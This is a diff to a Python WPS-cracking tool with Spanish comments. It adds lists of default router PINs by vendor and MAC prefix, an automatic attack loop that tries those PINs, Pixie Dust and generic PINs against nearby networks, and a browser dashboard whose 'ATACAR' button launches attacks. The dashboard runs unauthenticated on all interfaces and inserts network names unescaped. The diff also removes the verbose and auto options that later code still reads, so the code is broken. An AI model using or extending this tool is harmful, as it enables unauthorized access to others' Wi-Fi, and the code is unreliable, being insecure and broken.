@@ -20,17 +20,27 @@ class Colors:
     BOLD = '\033[1m'
     DIM = '\033[2m'
 
+WEB_LOGS = collections.deque(maxlen=100)
+
+def add_web_log(msg):
+    clean_msg = re.sub(r'\033\[[0-9;]*m', '', msg)
+    WEB_LOGS.append(f"[{datetime.now().strftime('%H:%M:%S')}] {clean_msg}")
+
 def info(msg):
     print(f"{Colors.DIM}•{Colors.RESET} {msg}")
+    add_web_log(f"• {msg}")
 
 def success(msg):
     print(f"{Colors.GREEN}✓{Colors.RESET} {msg}")
+    add_web_log(f"✓ {msg}")
 
 def error(msg):
     print(f"{Colors.RED}✗{Colors.RESET} {msg}")
+    add_web_log(f"✗ {msg}")
 
 def warning(msg):
     print(f"{Colors.YELLOW}!{Colors.RESET} {msg}")
+    add_web_log(f"! {msg}")
 
 def ani(z):
     for e in z + '\n':
@@ -176,7 +186,35 @@ class WPSpin:
     'pinTDW8961ND11': {'name': 'TD-W8961ND 11', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37494506},
     'pinTDW8961ND12': {'name': 'TD-W8961ND 12', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37494063},
     'pinTDW8961ND13': {'name': 'TD-W8961ND 13', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37489014},
-    'pinTDW8961ND14': {'name': 'TD-W8961ND 14', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37496081}}
+    'pinTDW8961ND14': {'name': 'TD-W8961ND 14', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37496081},
+    'pinTDW896N1D': {'name': 'TD-W896N1D', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37494650},
+    'pinTDW8961ND15': {'name': 'TD-W8961ND 15', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37490034},
+    # Netgear
+    'pinDGN1000_1': {'name': 'Netgear DGN1000 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 19004938},
+    'pinDGN1000_2': {'name': 'Netgear DGN1000 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 82234577},
+    'pinDGN1000_3': {'name': 'Netgear DGN1000 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 30022645},
+    'pinDGN1000_4': {'name': 'Netgear DGN1000 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 32312966},
+    'pinDGN1000_5': {'name': 'Netgear DGN1000 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 27334959},
+    'pinWNR2000_1': {'name': 'Netgear WNR2000 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 50292127},
+    'pinWNR2000_2': {'name': 'Netgear WNR2000 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 37380342},
+    'pinDGN2000': {'name': 'Netgear DGN2000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 38686191},
+    'pinDG834GU': {'name': 'Netgear DG834GU', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 64426679},
+    # Belkin
+    'pinF9J1102_1': {'name': 'Belkin F9J1102 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 19366838},
+    'pinF9J1102_2': {'name': 'Belkin F9J1102 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 87279320},
+    'pinF9J1102_3': {'name': 'Belkin F9J1102 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 83469909},
+    'pinF9J1102_4': {'name': 'Belkin F9J1102 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 14159114},
+    'pinF7D4401_1': {'name': 'Belkin F7D4401 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 15310828},
+    'pinF7D4401_2': {'name': 'Belkin F7D4401 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 36323364},
+    'pinF7D4401_3': {'name': 'Belkin F7D4401 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 17579957},
+    'pinF7D4401_4': {'name': 'Belkin F7D4401 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 8112118},
+    'pinF5D8635_1': {'name': 'Belkin F5D8635 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 12885381},
+    'pinF5D8635_2': {'name': 'Belkin F5D8635 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 29874590},
+    'pinF7D3402': {'name': 'Belkin F7D3402', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 8318725},
+    # DLink
+    'pinDIR655': {'name': 'DLink DIR-655', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 95061771},
+    'pinDSL2740B_1': {'name': 'DLink DSL-2740B 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 44686871},
+    'pinDSL2740B_2': {'name': 'DLink DSL-2740B 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 59185239}}
 
     @staticmethod
     def checksum(pin):
@@ -309,7 +347,18 @@ class WPSpin:
             'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
             'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
             'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
-            'pinONO': ('5C353B', 'DC537C')
+            'pinONO': ('5C353B', 'DC537C'),
+            # Nuevas sugerencias
+            'pinTPWR741N': ('E894F6', 'F8D111', '346BD3'),
+            'pinTPWR841N': ('E894F6', 'F8D111', '346BD3', '90F652'),
+            'pinTPWR842ND': ('E894F6', 'F8D111', '346BD3'),
+            'pinTDW8960N1': ('74EA3A', '90F652', 'F8D111'),
+            'pinTDW8961ND1': ('90F652', 'B0487A', 'F8D111'),
+            'pinDGN1000_1': ('E0469A', 'E091F5', '30469A', '0026F2'),
+            'pinF9J1102_1': ('EC1A59', '08863B'),
+            'pinF7D4401_1': ('944452', '08863B'),
+            'pinF5D8635_1': ('002275', '944452'),
+            'pinDIR655': ('002401', '00265A', '14D64D')
         }
         res = []
         for algo_id, masks in algorithms.items():
@@ -891,12 +940,38 @@ class Companion:
                 continue
 
             info(f'Intentando conectar a {bssid} ({network["ESSID"]})...')
-            if self.single_connection(bssid, pixiemode=pixiemode, showpixiecmd=showpixiecmd, pixieforce=pixieforce, auto=True):
-                success(f'Credenciales guardadas en conexiones.txt')
-                return True
-            else:
-                failed_bssids.add(bssid)
-                return True
+            
+            # Obtener todos los pines sugeridos para esta MAC
+            suggested_pins = self.generator.getSuggested(bssid)
+            tried_pins = set()
+            
+            # 1. Primero intentar los pines sugeridos por MAC
+            for pin_data in suggested_pins:
+                pin = pin_data['pin']
+                if pin in tried_pins: continue
+                
+                info(f'Probando pin sugerido: {pin} ({pin_data["name"]})')
+                if self.single_connection(bssid, pin=pin, pixiemode=False, auto=True):
+                    success(f'¡Éxito con PIN {pin}!')
+                    return True
+                tried_pins.add(pin)
+
+            # 2. Si no funcionaron o no hay sugeridos, intentar Pixie Dust si está activo
+            if pixiemode:
+                info(f'Intentando Pixie Dust en {bssid}...')
+                if self.single_connection(bssid, pixiemode=True, showpixiecmd=showpixiecmd, pixieforce=pixieforce, auto=True):
+                    return True
+
+            # 3. Como último recurso en auto, si la red es marcada como vulnerable pero no hay pines específicos, 
+            # intentar el pin genérico '12345670' o '00000000'
+            for generic_pin in ['12345670', '00000000']:
+                if generic_pin not in tried_pins:
+                    info(f'Probando pin genérico: {generic_pin}')
+                    if self.single_connection(bssid, pin=generic_pin, auto=True):
+                        return True
+            
+            # Si nada funcionó, marcar como fallido para este escaneo
+            failed_bssids.add(bssid)
         return False
     def cleanup(self):
         self.retsock.close()
@@ -1037,8 +1112,15 @@ class WiFiScanner:
         if not networks:
             return False
 
-        # Sorting by signal level
-        networks.sort(key=lambda x: x['Level'], reverse=True)
+        # Sorting by Signal, then by vulnerability, then by lock status
+        def sort_key(x):
+            model = '{} {}'.format(x['Model'], x['Model number'])
+            is_vuln = 1 if self.vuln_list and (model in self.vuln_list) else 0
+            is_locked = 1 if x['WPS locked'] else 0
+            # Higher signal (Level) is better, is_vuln is better, NOT locked is better
+            return (is_locked, -is_vuln, -x['Level'])
+
+        networks.sort(key=sort_key)
 
         # Putting a list of networks in a dictionary, where each key is a network number in list of networks
         network_list = {(i + 1): network for i, network in enumerate(networks)}
@@ -1171,84 +1253,240 @@ Example:
 """
 
 
+import json
+
+GLOBAL_STATE = {
+    'networks': {},
+    'is_scanning': False,
+    'current_attack': None,
+    'last_scan_time': None,
+    'scanner': None,
+    'companion': None,
+    'args': None
+}
+
 class WebHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
+    def _send_json(self, data):
         self.send_response(200)
-        self.send_header("Content-type", "text/html; charset=utf-8")
+        self.send_header("Content-type", "application/json")
         self.end_headers()
+        self.wfile.write(json.dumps(data).encode())
+
+    def do_GET(self):
+        if self.path == '/api/networks':
+            self._send_json(list(GLOBAL_STATE['networks'].values()))
+        elif self.path == '/api/logs':
+            self._send_json(list(WEB_LOGS))
+        elif self.path == '/api/status':
+            self._send_json({
+                'is_scanning': GLOBAL_STATE['is_scanning'],
+                'current_attack': GLOBAL_STATE['current_attack']
+            })
+        elif self.path == '/':
+            self.send_response(200)
+            self.send_header("Content-type", "text/html; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(self._get_dashboard_html().encode())
+        else:
+            self.send_error(404)
+
+    def do_POST(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        post_data = self.rfile.read(content_length).decode('utf-8')
         
-        rows = []
-        if os.path.exists('conexiones.txt'):
-            try:
-                with open('conexiones.txt', 'r', encoding='utf-8') as f:
-                    for line in f:
-                        if '|' in line:
-                            parts = line.split(' | ')
-                            entry = {}
-                            for p in parts:
-                                if ': ' in p:
-                                    k, v = p.split(': ', 1)
-                                    entry[k.strip()] = v.strip()
-                            if entry:
-                                rows.append(entry)
-            except Exception:
-                pass
-        
-        table_rows = ""
-        for row in rows:
-            table_rows += f'<tr><td data-label="BSSID">{row.get("BSSID", "-")}</td><td data-label="ESSID">{row.get("ESSID", "-")}</td><td data-label="Password" class="pwd">{row.get("Password", "-")}</td></tr>'
-        
-        html = f"""
+        try:
+            params = json.loads(post_data)
+        except:
+            params = {}
+
+        if self.path == '/api/scan':
+            if not GLOBAL_STATE['is_scanning']:
+                threading.Thread(target=self._bg_scan).start()
+                self._send_json({'status': 'ok', 'message': 'Escaneo iniciado'})
+            else:
+                self._send_json({'status': 'error', 'message': 'Ya hay un escaneo en curso'})
+
+        elif self.path == '/api/attack':
+            bssid = params.get('bssid')
+            if bssid and not GLOBAL_STATE['current_attack']:
+                threading.Thread(target=self._bg_attack, args=(bssid,)).start()
+                self._send_json({'status': 'ok', 'message': f'Ataque iniciado contra {bssid}'})
+            else:
+                self._send_json({'status': 'error', 'message': 'BSSID inválido o ataque en curso'})
+
+        elif self.path == '/api/stop':
+            # Implementar lógica para detener ataque si es posible
+            self._send_json({'status': 'ok', 'message': 'Petición de parada enviada'})
+
+    def _bg_scan(self):
+        GLOBAL_STATE['is_scanning'] = True
+        info("Escaneando redes desde la interfaz web...")
+        try:
+            nets = GLOBAL_STATE['scanner'].iw_scanner()
+            if nets:
+                GLOBAL_STATE['networks'] = nets
+                success(f"Encontradas {len(nets)} redes")
+        except Exception as e:
+            error(f"Error en escaneo web: {e}")
+        GLOBAL_STATE['is_scanning'] = False
+
+    def _bg_attack(self, bssid):
+        GLOBAL_STATE['current_attack'] = bssid
+        info(f"Iniciando ataque web contra {bssid}...")
+        try:
+            args = GLOBAL_STATE['args']
+            if not GLOBAL_STATE['companion']:
+                GLOBAL_STATE['companion'] = Companion(args.interface, args.write, print_debug=args.verbose)
+            
+            GLOBAL_STATE['companion'].single_connection(
+                bssid, 
+                pixiemode=args.pixie_dust, 
+                showpixiecmd=args.show_pixie_cmd, 
+                pixieforce=args.pixie_force, 
+                auto=True
+            )
+        except Exception as e:
+            error(f"Error en ataque web: {e}")
+        GLOBAL_STATE['current_attack'] = None
+
+    def _get_dashboard_html(self):
+        return """
         <!DOCTYPE html>
-        <html lang="es">
+        <html>
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>WPS Auditor - Contraseñas</title>
-            <meta http-equiv="refresh" content="5">
+            <title>WPS Auditor PRO</title>
             <style>
-                :root {{ --primary: #4CAF50; --bg: #121212; --card: #1e1e1e; --text: #e0e0e0; }}
-                body {{ font-family: 'Segoe UI', sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding: 20px; }}
-                .container {{ max-width: 900px; margin: 0 auto; }}
-                h1 {{ color: var(--primary); border-bottom: 2px solid var(--primary); padding-bottom: 10px; }}
-                .stats {{ color: #888; margin-bottom: 20px; font-size: 0.9em; }}
-                table {{ width: 100%; border-collapse: collapse; background: var(--card); border-radius: 8px; overflow: hidden; }}
-                th {{ background: #333; color: var(--primary); text-align: left; padding: 12px; }}
-                td {{ padding: 12px; border-bottom: 1px solid #333; }}
-                .pwd {{ font-family: monospace; color: #ffeb3b; font-weight: bold; }}
-                @media (max-width: 600px) {{ 
-                    table, thead, tbody, th, td, tr {{ display: block; }}
-                    th {{ display: none; }}
-                    tr {{ margin-bottom: 15px; border: 1px solid #333; border-radius: 8px; }}
-                    td {{ position: relative; padding-left: 50%; }}
-                    td:before {{ position: absolute; left: 12px; font-weight: bold; color: var(--primary); content: attr(data-label) ": "; }}
-                }}
+                :root { --primary: #00e676; --bg: #0a0a0a; --card: #151515; --text: #eee; }
+                body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin:0; }
+                .header { padding: 20px; background: var(--card); border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
+                .btn { padding: 10px 20px; border-radius: 5px; border:none; cursor:pointer; font-weight: bold; transition: 0.3s; }
+                .btn-scan { background: var(--primary); color: #000; }
+                .btn-attack { background: #2196F3; color: #fff; padding: 5px 10px; font-size: 12px; }
+                .container { padding: 20px; display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
+                .card { background: var(--card); border-radius: 10px; padding: 15px; border: 1px solid #222; }
+                table { width:100%; border-collapse: collapse; margin-top: 10px; }
+                th { text-align: left; color: #888; font-size: 12px; padding: 10px; border-bottom: 1px solid #222; }
+                td { padding: 12px 10px; border-bottom: 1px solid #111; font-size: 14px; }
+                .logs { background: #000; color: #0f0; font-family: monospace; height: 300px; overflow-y: auto; padding: 10px; font-size: 12px; border-radius: 5px; }
+                .vuln { color: var(--primary); font-weight: bold; }
+                .locked { color: #f44336; }
+                @media (max-width: 900px) { .container { grid-template-columns: 1fr; } }
             </style>
         </head>
         <body>
-            <div class="container">
-                <h1>WPS Auditor - En Tiempo Real</h1>
-                <div class="stats">Actualizado: {datetime.now().strftime("%H:%M:%S")} | Auto-refresco: 5s</div>
-                <table>
-                    <thead><tr><th>BSSID</th><th>ESSID</th><th>Password</th></tr></thead>
-                    <tbody>{table_rows if table_rows else '<tr><td colspan="3" style="text-align:center">Esperando contraseñas...</td></tr>'}</tbody>
-                </table>
+            <div class="header">
+                <div style="font-size: 20px; font-weight: bold;">WPS Auditor <span style="color:var(--primary)">App</span></div>
+                <button class="btn btn-scan" onclick="startScan()" id="scanBtn">ESCANEAR</button>
             </div>
+            <div class="container">
+                <div class="card">
+                    <h3 style="margin-top:0">Redes Detectadas</h3>
+                    <div id="networksList">Cargando redes...</div>
+                </div>
+                <div class="card">
+                    <h3 style="margin-top:0">Terminal / Logs</h3>
+                    <div class="logs" id="logs"></div>
+                </div>
+            </div>
+
+            <script>
+                async function startScan() {
+                    document.getElementById('scanBtn').disabled = true;
+                    document.getElementById('scanBtn').innerText = 'ESCANEANDO...';
+                    await fetch('/api/scan', {method: 'POST'});
+                }
+
+                async function attack(bssid) {
+                    if(!confirm('¿Iniciar ataque contra ' + bssid + '?')) return;
+                    await fetch('/api/attack', {
+                        method: 'POST',
+                        body: JSON.stringify({bssid: bssid})
+                    });
+                }
+
+                function updateLogs() {
+                    fetch('/api/logs').then(r => r.json()).then(logs => {
+                        const div = document.getElementById('logs');
+                        div.innerHTML = logs.map(l => `<div>${l}</div>`).join('');
+                        div.scrollTop = div.scrollHeight;
+                    });
+                }
+
+                function updateNetworks() {
+                    fetch('/api/networks').then(r => r.json()).then(nets => {
+                        if(nets.length == 0) return;
+                        let html = '<table><tr><th>ESSID</th><th>BSSID</th><th>PWR</th><th>WPS</th><th>ACCION</th></tr>';
+                        nets.forEach(n => {
+                            const isVuln = n.Model && n.Model.includes('Archer'); // Ejemplo simple
+                            const wps = n['WPS locked'] ? '<span class="locked">Locked</span>' : '<span class="vuln">Unlocked</span>';
+                            html += `<tr>
+                                <td class="${isVuln ? 'vuln' : ''}">${n.ESSID}</td>
+                                <td>${n.BSSID}</td>
+                                <td>${n.Level}</td>
+                                <td>${wps}</td>
+                                <td><button class="btn btn-attack" onclick="attack('${n.BSSID}')">ATACAR</button></td>
+                            </tr>`;
+                        });
+                        html += '</table>';
+                        document.getElementById('networksList').innerHTML = html;
+                    });
+                }
+
+                function updateStatus() {
+                    fetch('/api/status').then(r => r.json()).then(status => {
+                        const btn = document.getElementById('scanBtn');
+                        if(status.is_scanning) {
+                            btn.disabled = true;
+                            btn.innerText = 'ESCANEANDO...';
+                        } else {
+                            btn.disabled = false;
+                            btn.innerText = 'ESCANEAR';
+                        }
+                    });
+                }
+
+                setInterval(updateLogs, 2000);
+                setInterval(updateNetworks, 3000);
+                setInterval(updateStatus, 2000);
+                updateLogs();
+                updateNetworks();
+            </script>
         </body>
         </html>
         """
-        self.wfile.write(html.encode())
 
-def start_web_server(port=8080):
+
+def open_browser(port):
+    try:
+        # Intentar abrir con termux-open-url (Android/Termux) o xdg-open (Linux)
+        for cmd in [f"termux-open-url http://localhost:{port}", f"xdg-open http://localhost:{port}"]:
+            if subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
+                break
+    except:
+        pass
+
+def start_web_server(scanner, args, port=8080):
+    GLOBAL_STATE['scanner'] = scanner
+    GLOBAL_STATE['args'] = args
+
     def run():
         try:
             server = HTTPServer(('0.0.0.0', port), WebHandler)
             server.serve_forever()
         except Exception as e:
-            pass
+            error(f"Error en servidor web: {e}")
+
     thread = threading.Thread(target=run, daemon=True)
     thread.start()
-    print(f"{{Colors.GREEN}}[*] {{Colors.WHITE}}Servidor web iniciado en {{Colors.CYAN}}http://localhost:{{port}}{{Colors.RESET}}")
+
+    print(f"\n{Colors.GREEN}[*]{Colors.WHITE} App Web iniciada en {Colors.CYAN}http://localhost:{port}{Colors.RESET}")
+    print(f"{Colors.DIM}• Controla el escaneo y los ataques desde tu navegador.{Colors.RESET}\n")
+
+    # Abrir navegador automáticamente
+    open_browser(port)
+
     return thread
 
 
@@ -1328,19 +1566,9 @@ if __name__ == '__main__':
         help='Reverse order of networks in the list of networks. Useful on small displays'
     )
     parser.add_argument(
-        '-v', '--verbose',
+        '-W', '--web',
         action='store_true',
-        help='Verbose output'
-        )
-    parser.add_argument(
-        '-A', '--auto',
-        action='store_true',
-        help='Conectar automáticamente a redes disponibles y guardar en conexiones.txt'
-    )
-    parser.add_argument(
-        '--web',
-        action='store_true',
-        help='Exponer una web para ver las contraseñas en tiempo real'
+        help='Iniciar la App Web en localhost para controlar todo desde el navegador'
     )
     parser.add_argument(
         '--web-port',
@@ -1362,25 +1590,33 @@ if __name__ == '__main__':
             info("Usa 'sudo' para ejecutar este script.")
         sys.exit(1)
 
-    if args.web:
-        start_web_server(args.web_port)
-
     if not ifaceUp(args.interface):
         die(f'Unable to up interface "{args.interface}"')
 
     check_and_disconnect(args.interface)
 
+    # Cargar lista vulnerable una vez
+    try:
+        with open(args.vuln_list, 'r', encoding='utf-8') as file:
+            vuln_list = file.read().splitlines()
+    except FileNotFoundError:
+        vuln_list = []
+    
+    scanner = WiFiScanner(args.interface, vuln_list)
+
+    if args.web:
+        start_web_server(scanner, args, args.web_port)
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            ani(f"\n{Colors.RED}[!] Goodbye!{Colors.RESET}")
+            sys.exit(0)
+
     failed_bssids = set()
     companion = None
     while True:
         try:
-            try:
-                with open(args.vuln_list, 'r', encoding='utf-8') as file:
-                    vuln_list = file.read().splitlines()
-            except FileNotFoundError:
-                vuln_list = []
-            scanner = WiFiScanner(args.interface, vuln_list)
-
             if args.auto:
                 if not companion:
                     companion = Companion(args.interface, args.write, print_debug=args.verbose)
